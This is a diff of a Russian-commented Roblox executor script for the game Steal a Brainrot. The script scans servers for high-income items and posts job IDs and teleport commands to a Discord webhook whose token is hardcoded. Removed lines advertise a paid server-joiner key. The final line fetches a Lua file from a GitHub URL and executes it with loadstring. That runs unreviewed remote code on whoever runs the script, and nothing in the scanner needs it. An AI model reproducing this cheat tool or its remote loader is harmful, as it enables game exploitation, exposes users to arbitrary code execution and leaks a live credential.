@@ -1,22 +1,19 @@
--- 🎯 QUANTUM FINDER v3.7 (МУЛЬТИ-ВЕБХУК СИСТЕМА)
--- Сканирует все объекты в Steal a Brainrot и отправляет уведомления на разные вебхуки
+-- 🎯 BRAINROT INCOME SCANNER v2.0 (ИНДИВИДУАЛЬНЫЕ ПОРОГИ)
+-- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
+-- Запуск: автоматически при старте + по клавише F
 
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 
--- ⚙️ ВЕБХУКИ
-local WEBHOOKS = {
-    FREE = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI',
-    MEDIUM = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI',
-    HARD = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI',
-    CUSTOM = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI',
-    JOINER_MEDIUM = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI',
-    JOINER_HARD = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI'
-}
+-- ⚙️ НАСТРОЙКИ
+local DEFAULT_THRESHOLD = 50_000_000 -- Порог по умолчанию
+local DISCORD_WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1449338633218949201/0cC2kYc5bnPJ8LbQnFjTkuPSyl6B444DcnDwZjjxRGIm-r8B1ht96SUFjDOq1Cer1KzI'
 
--- 🎮 ОБЪЕКТЫ ДЛЯ КАСТОМНОГО ВЕБХУКА (порог для отправки ТОЛЬКО на ваш вебхук)
-local CUSTOM_OBJECTS = {
+print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
+
+-- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ИНДИВИДУАЛЬНЫМИ ПОРОГАМИ
+local OBJECTS = {
     ['Garama and Madundung'] = { emoji = '🍝', threshold = 0 },
     ['Dragon Cannelloni'] = { emoji = '🐲', threshold = 0 },
     ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 240000000 },
@@ -70,16 +67,7 @@ local CUSTOM_OBJECTS = {
     ['Money Money Reinted'] = { emoji = '🫰', threshold = 250000000 },
 }
 
--- 📊 ДИАПАЗОНЫ ДЛЯ ОБЫЧНЫХ ВЕБХУКОВ
-local RANGES = {
-    FREE = { min = 1000000, max = 10000000, color = 0x00ff00 }, -- Зеленый
-    MEDIUM = { min = 10000000, max = 100000000, color = 0xffff00 }, -- Желтый
-    HARD = { min = 100000000, max = math.huge, color = 0xff0000 } -- Красный
-}
-
-print('🎯 Quantum Finder v3.7 | JobId:', game.JobId)
-
--- 💰 ПАРСЕР ДОХОДА (остается без изменений)
+-- 💰 ПАРСЕР ДОХОДА
 local function parseGenerationText(s)
     if type(s) ~= 'string' or s == '' then
         return nil
@@ -131,7 +119,7 @@ local function formatIncomeNumber(n)
     end
 end
 
--- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI (остается без изменений)
+-- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
 local function grabText(inst)
     if not inst then
         return nil
@@ -208,15 +196,16 @@ local function isGuidName(s)
     return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
 end
 
--- 🔍 СКАНЕРЫ (остаются без изменений)
+-- 🔍 ФУНКЦИЯ ПОИСКА ПРИБЫЛИ В DEBRIS FOLDER
 local function scanDebrisForIncome()
     local DebrisFolder = workspace:FindFirstChild("Debris")
     if not DebrisFolder then 
-        print("⚠️ Debris folder not found")
+        print("⚠️ Папка Debris не найдена")
         return {} 
     end
 
     local results = {}
+
     for _, inst in ipairs(DebrisFolder:GetDescendants()) do
         if inst.Name == "FastOverheadTemplate" then
             local gui = inst:FindFirstChild("GUI")
@@ -224,20 +213,37 @@ local function scanDebrisForIncome()
             local genInst = gui and gui:FindFirstChild("Generation")
             local genText = genInst and grabText(genInst) or nil
             local genNum = genText and parseGenerationText(genText) or nil
+
             if name and genNum then
-                table.insert(results, { name = name, gen = genNum })
+                table.insert(results, { name = name, genText = genText, gen = genNum, location = "Debris" })
             end
         end
     end
+
+    -- Сортировка по доходу (убывание)
+    table.sort(results, function(a, b) return a.gen > b.gen end)
+
+    -- Вывод в консоль
+    if #results > 0 then
+        print("\n📊 НАЙДЕНО В DEBRIS FOLDER:")
+        for _, r in ipairs(results) do
+            print(string.format("   %s - %s (%.0f/s)", r.name, r.genText, r.gen))
+        end
+    else
+        print("📭 В Debris folder объектов не найдено")
+    end
+
     return results
 end
 
+-- 🔍 ПОЛНЫЕ СКАНЕРЫ
 local function scanPlots()
     local results = {}
     local Plots = workspace:FindFirstChild('Plots')
     if not Plots then
         return results
     end
+
     for _, plot in ipairs(Plots:GetChildren()) do
         local Podiums = plot:FindFirstChild('AnimalPodiums')
         if Podiums then
@@ -249,9 +255,13 @@ local function scanPlots()
                     and Attachment:FindFirstChild('AnimalOverhead')
                 if Overhead then
                     local name, genText = getOverheadInfo(Overhead)
-                    local genNum = genText and parseGenerationText(genText) or nil
+                    local genNum = genText and parseGenerationText(genText)
+                        or nil
                     if name and genNum then
-                        table.insert(results, { name = name, gen = genNum })
+                        table.insert(
+                            results,
+                            { name = name, gen = genNum, location = 'Plot' }
+                        )
                     end
                 end
             end
@@ -271,7 +281,10 @@ local function scanRunway()
                 local name, genText = getOverheadInfo(overhead)
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(results, { name = name, gen = genNum })
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'Runway' }
+                    )
                 end
             end
         end
@@ -288,7 +301,10 @@ local function scanAllOverheads()
                 local name, genText = getOverheadInfo(child)
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(results, { name = name, gen = genNum })
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'World' }
+                    )
                 end
             end
             pcall(function()
@@ -306,17 +322,22 @@ local function scanPlayerGui()
     if not lp then
         return results
     end
+
     local playerGui = lp:FindFirstChild('PlayerGui')
     if not playerGui then
         return results
     end
+
     local function searchInGui(parent)
         for _, child in ipairs(parent:GetChildren()) do
             if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
                 local name, genText = getOverheadInfo(child)
                 local genNum = genText and parseGenerationText(genText) or nil
                 if name and genNum then
-                    table.insert(results, { name = name, gen = genNum })
+                    table.insert(
+                        results,
+                        { name = name, gen = genNum, location = 'GUI' }
+                    )
                 end
             end
             pcall(function()
@@ -332,20 +353,24 @@ end
 local function collectAll(timeoutSec)
     local t0 = os.clock()
     local collected = {}
+
     repeat
         collected = {}
+
         local allSources = {
             scanPlots(),
             scanRunway(),
             scanAllOverheads(),
             scanPlayerGui(),
-            scanDebrisForIncome(),
+            scanDebrisForIncome(), -- Добавлен сканирование Debris
         }
+
         for _, source in ipairs(allSources) do
             for _, item in ipairs(source) do
                 table.insert(collected, item)
             end
         end
+
         local seen, unique = {}, {}
         for _, item in ipairs(collected) do
             local key = item.name .. ':' .. tostring(item.gen)
@@ -355,11 +380,13 @@ local function collectAll(timeoutSec)
             end
         end
         collected = unique
+
         if #collected > 0 then
             break
         end
         task.wait(0.5)
     until os.clock() - t0 > timeoutSec
+
     return collected
 end
 
@@ -372,291 +399,82 @@ local function getRequester()
         or (KRNL_HTTP and KRNL_HTTP.request)
 end
 
--- 🔄 РАСПРЕДЕЛЕНИЕ ОБЪЕКТОВ ПО ГРУППАМ
-local function categorizeObjects(objects)
-    local categories = {
-        FREE = {},          -- 1M - 10M
-        MEDIUM = {},        -- 10M - 100M
-        HARD = {},          -- 100M+
-        CUSTOM = {},        -- Объекты для вашего вебхука
-        JOINER_MEDIUM = {}, -- 10M - 100M для joiner вебхука
-        JOINER_HARD = {}    -- 100M+ для joiner вебхука
-    }
-    
-    for _, obj in ipairs(objects) do
-        if not obj.gen then
-            continue
-        end
-        
-        -- Проверяем, является ли объект кастомным (для вашего вебхука)
-        local customConfig = CUSTOM_OBJECTS[obj.name]
-        local isCustomObject = false
-        
-        if customConfig and obj.gen >= customConfig.threshold then
-            -- Если объект из кастомного списка И его доход >= порога
-            isCustomObject = true
-            table.insert(categories.CUSTOM, {
-                name = obj.name,
-                gen = obj.gen,
-                emoji = customConfig.emoji,
-                threshold = customConfig.threshold
-            })
-            print(string.format('✅ CUSTOM OBJECT FOUND: %s %s (%s >= %s)', 
-                customConfig.emoji, 
-                obj.name, 
-                formatIncomeNumber(obj.gen), 
-                formatIncomeNumber(customConfig.threshold)))
-        end
-        
-        -- Если объект НЕ кастомный, то распределяем по обычным категориям
-        if not isCustomObject then
-            -- Распределяем по обычным категориям
-            if obj.gen >= RANGES.HARD.min then
-                table.insert(categories.HARD, obj)
-                table.insert(categories.JOINER_HARD, obj)
-            elseif obj.gen >= RANGES.MEDIUM.min and obj.gen < RANGES.MEDIUM.max then
-                table.insert(categories.MEDIUM, obj)
-                table.insert(categories.JOINER_MEDIUM, obj)
-            elseif obj.gen >= RANGES.FREE.min and obj.gen < RANGES.FREE.max then
-                table.insert(categories.FREE, obj)
-            end
-        else
-            -- Объект кастомный, но всё равно добавляем в JOINER категории если подходит
-            if obj.gen >= RANGES.HARD.min then
-                table.insert(categories.JOINER_HARD, obj)
-            elseif obj.gen >= RANGES.MEDIUM.min and obj.gen < RANGES.MEDIUM.max then
-                table.insert(categories.JOINER_MEDIUM, obj)
-            end
-        end
-    end
-    
-    return categories
-end
-
--- 🎨 ОТПРАВКА ОБЫЧНЫХ УВЕДОМЛЕНИЙ (на английском)
-local function sendDiscordNotification(category, objects, color, botName)
+local function sendDiscordNotification(filteredObjects)
     local req = getRequester()
     if not req then
-        warn('❌ No HTTP API in executor')
+        warn('❌ Нет HTTP API в executor')
         return
     end
-    
-    if #objects == 0 then
-        print(string.format('⚠️ No objects for %s webhook', category))
-        return
-    end
-    
+
     local jobId = game.JobId
     local placeId = game.PlaceId
-    
-    -- Сортируем по доходу (убывание)
-    table.sort(objects, function(a, b)
-        return a.gen > b.gen
-    end)
-    
-    -- Формируем список объектов
-    local objectsList = {}
-    local maxDisplay = math.min(10, #objects)
-    
-    for i = 1, maxDisplay do
-        local obj = objects[i]
-        if category == 'CUSTOM' then
-            -- Для кастомного вебхука используем эмодзи из CUSTOM_OBJECTS
-            table.insert(
-                objectsList,
-                string.format(
-                    '%s **%s** - %s (threshold: %s)',
-                    obj.emoji or '💰',
-                    obj.name,
-                    formatIncomeNumber(obj.gen),
-                    formatIncomeNumber(obj.threshold)
-                )
-            )
-        else
-            -- Для вебхуков 1-3 (FREE, MEDIUM, HARD) используем всегда 💰
-            table.insert(
-                objectsList,
-                string.format(
-                    '💰 **%s** - %s',
-                    obj.name,
-                    formatIncomeNumber(obj.gen)
-                )
-            )
-        end
-    end
-    
-    if #objects > maxDisplay then
-        table.insert(objectsList, string.format('... and %d more objects', #objects - maxDisplay))
-    end
-    
-    local objectsText = table.concat(objectsList, '\n')
-    
-    -- Телепорт команда в копируемом формате
-    local teleportText = string.format(
-        "```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(%d, '%s')\n```",
-        placeId,
-        jobId
-    )
-    
-    -- Тайтлы для разных категорий (на английском)
-    local titles = {
-        FREE = '💚 FREE TIER (1M - 10M)',
-        MEDIUM = '💛 MEDIUM TIER (10M - 100M)',
-        HARD = '❤️ HARD TIER (100M+)',
-        CUSTOM = '💎 IMPORTANT OBJECTS'
-    }
-    
-    -- Для вебхуков 1-3 (FREE, MEDIUM, HARD) отправляем только телепорт команду, без отдельного Job ID
-    local fields = {}
-    
-    if category == 'FREE' or category == 'MEDIUM' or category == 'HARD' then
-        -- Только для 1-3 вебхуков: убираем отдельный Job ID, оставляем только телепорт команду
-        fields = {
-            {
-                name = '📊 Objects:',
-                value = objectsText,
-                inline = false,
-            },
-            {
-                name = '🚀 Teleport:',
-                value = teleportText,
-                inline = false,
-            },
-        }
-    else
-        -- Для CUSTOM вебхука отправляем всё как было
-        fields = {
-            {
-                name = '🆔 Server (Job ID)',
-                value = string.format('```%s```', jobId),
-                inline = false,
-            },
-            {
-                name = '📊 Objects:',
-                value = objectsText,
-                inline = false,
-            },
-            {
-                name = '🚀 Teleport:',
-                value = teleportText,
-                inline = false,
-            },
-        }
-    end
-    
-    local payload = {
-        username = botName,
-        embeds = {
-            {
-                title = titles[category] or '💰 Quantum Finder',
-                color = color,
-                fields = fields,
-                footer = {
-                    text = string.format(
-                        'Found: %d objects • %s',
-                        #objects,
-                        os.date('%H:%M:%S')
-                    ),
-                },
-                timestamp = DateTime.now():ToIsoDate(),
-            },
-        },
-    }
-    
-    print(string.format('📤 Sending to %s webhook: %d objects', category, #objects))
-    
-    local ok, res = pcall(function()
-        local response = req({
-            Url = WEBHOOKS[category],
-            Method = 'POST',
-            Headers = { ['Content-Type'] = 'application/json' },
-            Body = HttpService:JSONEncode(payload),
-        })
-        
-        print(string.format('📡 HTTP Response Code: %s', response.StatusCode))
-        return response
-    end)
-    
-    if ok then
-        print('✅ Notification sent successfully!')
-    else
-        warn('❌ Send error:', res)
-        print(string.format('❌ Failed to send to %s webhook', category))
-    end
-end
 
--- 🎨 ОТПРАВКА JOINER УВЕДОМЛЕНИЙ (только на английском)
-local function sendJoinerNotification(category, objects, color, botName)
-    local req = getRequester()
-    if not req then
-        warn('❌ No HTTP API in executor')
+    if #filteredObjects == 0 then
+        print('🔍 Объектов выше порога не найдено')
         return
     end
-    
-    if #objects == 0 then
-        print(string.format('⚠️ No objects for %s webhook', category))
-        return
-    end
-    
+
     -- Сортируем по доходу (убывание)
-    table.sort(objects, function(a, b)
+    table.sort(filteredObjects, function(a, b)
         return a.gen > b.gen
     end)
-    
-    -- Формируем список объектов
+
+    -- Формируем красивый список
     local objectsList = {}
-    local maxDisplay = math.min(10, #objects)
-    
-    for i = 1, maxDisplay do
-        local obj = objects[i]
-        -- Для joiner вебхуков ВСЕГДА используем 💰
+    for i = 1, math.min(15, #filteredObjects) do
+        local obj = filteredObjects[i]
+        local cfg = OBJECTS[obj.name] or {}
+        local emoji = cfg.emoji or '💰'
+        local threshold = cfg.threshold or DEFAULT_THRESHOLD
+
         table.insert(
             objectsList,
             string.format(
-                '💰 **%s** - %s',
+                '%s **%s** (%s) - порог: %s | %s',
+                emoji,
                 obj.name,
-                formatIncomeNumber(obj.gen)
+                formatIncomeNumber(obj.gen),
+                formatIncomeNumber(threshold),
+                obj.location or 'Unknown'
             )
         )
     end
-    
-    if #objects > maxDisplay then
-        table.insert(objectsList, string.format('... and %d more objects', #objects - maxDisplay))
-    end
-    
     local objectsText = table.concat(objectsList, '\n')
-    
-    -- Реклама ключа (упрощенная)
-    local advertisement = "**Want to join such servers? Buy a key for our joiner:**\nhttps://discord.com/channels/1452341247086952724/1453742218291580948"
-    
-    -- Тайтлы для joiner категорий
-    local titles = {
-        JOINER_MEDIUM = '💛 MEDIUM TIER SERVER (10M - 100M)',
-        JOINER_HARD = '❤️ HARD TIER SERVER (100M+)'
-    }
-    
+
+    -- Телепорт команда
+    local teleportText = string.format(
+        "`local ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')`",
+        placeId,
+        jobId
+    )
+
     local payload = {
-        username = botName,
+        username = '🎯 Brainrot Scanner',
         embeds = {
             {
-                title = titles[category] or '💰 Joiner Notification',
-                color = color,
+                title = '💎 Найдены объекты выше порога!',
+                color = 0x2f3136,
                 fields = {
                     {
-                        name = '📊 Objects on server:',
+                        name = '🆔 Сервер (Job ID)',
+                        value = string.format('```%s```', jobId),
+                        inline = false,
+                    },
+                    {
+                        name = '💰 Объекты:',
                         value = objectsText,
                         inline = false,
                     },
                     {
-                        name = '🔑 Server access:',
-                        value = advertisement,
+                        name = '🚀 Телепорт:',
+                        value = teleportText,
                         inline = false,
                     },
                 },
                 footer = {
                     text = string.format(
-                        'Found: %d objects • %s',
-                        #objects,
+                        'Найдено: %d объектов • %s',
+                        #filteredObjects,
                         os.date('%H:%M:%S')
                     ),
                 },
@@ -664,92 +482,86 @@ local function sendJoinerNotification(category, objects, color, botName)
             },
         },
     }
-    
-    print(string.format('📤 Sending to %s webhook: %d objects', category, #objects))
-    
+
+    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')
+
     local ok, res = pcall(function()
-        local response = req({
-            Url = WEBHOOKS[category],
+        return req({
+            Url = DISCORD_WEBHOOK_URL,
             Method = 'POST',
             Headers = { ['Content-Type'] = 'application/json' },
             Body = HttpService:JSONEncode(payload),
         })
-        
-        print(string.format('📡 HTTP Response Code: %s', response.StatusCode))
-        return response
     end)
-    
+
     if ok then
-        print('✅ Joiner notification sent successfully!')
+        print('✅ Уведомление отправлено в Discord!')
     else
-        warn('❌ Joiner send error:', res)
+        warn('❌ Ошибка отправки:', res)
     end
 end
 
 -- 🎮 ГЛАВНАЯ ФУНКЦИЯ
 local function scanAndNotify()
-    print('🔍 Scanning all objects...')
+    print('🔍 Сканирую все объекты...')
     
+    -- Сначала сканируем Debris отдельно для вывода в консоль
+    scanDebrisForIncome()
+    
+    -- Затем собираем все объекты
     local allFound = collectAll(8.0)
-    
-    if #allFound == 0 then
-        print('❌ No objects found')
-        return
+
+    -- Фильтрация по индивидуальным порогам
+    local filtered = {}
+    for _, obj in ipairs(allFound) do
+        local cfg = OBJECTS[obj.name]
+        if cfg and obj.gen then
+            local threshold = cfg.threshold or DEFAULT_THRESHOLD
+            if obj.gen >= threshold then
+                table.insert(filtered, obj)
+            end
+        end
     end
-    
-    print(string.format('📊 Total objects found: %d', #allFound))
-    
-    -- Выводим все найденные объекты для отладки
-    print('\n📋 ALL FOUND OBJECTS:')
-    for i, obj in ipairs(allFound) do
-        print(string.format('   %d. %s: %s', i, obj.name, formatIncomeNumber(obj.gen)))
-    end
-    
-    -- Категоризация объектов
-    print('\n🔍 Categorizing objects...')
-    local categories = categorizeObjects(allFound)
-    
-    -- Отправка обычных уведомлений (на английском)
-    print('\n📤 Sending notifications...')
-    sendDiscordNotification('FREE', categories.FREE, RANGES.FREE.color, 'Quantum Finder')
-    sendDiscordNotification('MEDIUM', categories.MEDIUM, RANGES.MEDIUM.color, 'Quantum Finder')
-    sendDiscordNotification('HARD', categories.HARD, RANGES.HARD.color, 'Quantum Finder')
-    
-    -- Особый вывод для CUSTOM вебхука
-    print('\n🎯 CUSTOM WEBHOOK INFO:')
-    if #categories.CUSTOM == 0 then
-        print('⚠️ No custom objects found for CUSTOM webhook')
-    else
-        print(string.format('✅ Found %d custom objects for CUSTOM webhook', #categories.CUSTOM))
-        sendDiscordNotification('CUSTOM', categories.CUSTOM, 0x2f3136, 'Brainrot Scanner')
-    end
-    
-    -- Отправка joiner уведомлений
-    sendJoinerNotification('JOINER_MEDIUM', categories.JOINER_MEDIUM, 0xffff00, 'Server Joiner')
-    sendJoinerNotification('JOINER_HARD', categories.JOINER_HARD, 0xff0000, 'Server Joiner')
-    
+
     -- Вывод в консоль
-    print('\n📊 DISTRIBUTION REPORT:')
-    print(string.format('   FREE (1M-10M): %d objects', #categories.FREE))
-    print(string.format('   MEDIUM (10M-100M): %d objects', #categories.MEDIUM))
-    print(string.format('   HARD (100M+): %d objects', #categories.HARD))
-    print(string.format('   CUSTOM (important): %d objects', #categories.CUSTOM))
-    print(string.format('   JOINER_MEDIUM (10M-100M): %d objects', #categories.JOINER_MEDIUM))
-    print(string.format('   JOINER_HARD (100M+): %d objects', #categories.JOINER_HARD))
+    print('\n📊 ОБЩИЙ ОТЧЕТ:')
+    print('Найдено всего объектов:', #allFound)
+    print('Выше порога:', #filtered)
+
+    for _, obj in ipairs(filtered) do
+        local cfg = OBJECTS[obj.name] or {}
+        local emoji = cfg.emoji or '💰'
+        local threshold = cfg.threshold or DEFAULT_THRESHOLD
+
+        print(
+            string.format(
+                '%s %s: %s (%s) - порог: %s',
+                emoji,
+                obj.name,
+                formatIncomeNumber(obj.gen),
+                obj.location or 'Unknown',
+                formatIncomeNumber(threshold)
+            )
+        )
+    end
+
+    -- Отправляем уведомление если есть что показать
+    if #filtered > 0 then
+        sendDiscordNotification(filtered)
+    else
+        print('🔍 Нет объектов выше порога')
+    end
 end
 
 -- 🚀 ЗАПУСК
-print('🎯 === QUANTUM FINDER v3.7 ===')
-print('💡 Multi-webhook system with priorities')
-print('📊 Ranges: FREE(1M-10M) | MEDIUM(10M-100M) | HARD(100M+)')
-print('💎 Custom objects go ONLY to CUSTOM webhook, NOT to FREE/MEDIUM/HARD')
-print('💰 FREE/MEDIUM/HARD/JOINER: All objects with 💰 emoji | CUSTOM: Custom emojis')
-print('🔑 Joiner notifications for 10M+ and 100M+')
-print('🚀 Webhooks 1-3: Teleport command only | Webhook 4: Full info')
+print('🎯 === BRAINROT INCOME SCANNER (ИНДИВИДУАЛЬНЫЕ ПОРОГИ) ===')
+print('💡 Каждый объект имеет свой порог уведомления')
+print('⚙️  Настрой пороги в разделе OBJECTS')
+print('📁 Добавлено сканирование Debris folder')
 
--- Показываем кастомные пороги
-print('\n📊 CUSTOM THRESHOLDS:')
-for name, cfg in pairs(CUSTOM_OBJECTS) do
+-- Показываем текущие пороги
+print('\n📊 ТЕКУЩИЕ ПОРОГИ:')
+for name, cfg in pairs(OBJECTS) do
     print(string.format('   %s %s: %s', cfg.emoji, name, formatIncomeNumber(cfg.threshold)))
 end
 print('')
@@ -768,16 +580,14 @@ UserInputService.InputBegan:Connect(function(input, gpe)
             return
         end
         lastScan = now
-        print('\n🔄 === RESCAN (F) ===')
+        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
         scanAndNotify()
     end
 end)
 
-print('💡 Press F to rescan')
-print('🎨 Colors: Green(FREE) | Yellow(MEDIUM) | Red(HARD)')
-print('🤖 Bots: Quantum Finder (FREE/MEDIUM/HARD) | Brainrot Scanner (CUSTOM) | Server Joiner (JOINER)')
-print('💰 Emoji: All objects on FREE/MEDIUM/HARD/JOINER webhooks use 💰 emoji')
-
+print('💡 Нажмите F для повторного сканирования')
+print('📱 Discord webhook готов к отправке уведомлений')
+print('📁 Debris сканирование активно')
 
 -- Загрузка дополнительного скрипта
 loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/bottik.lua"))()
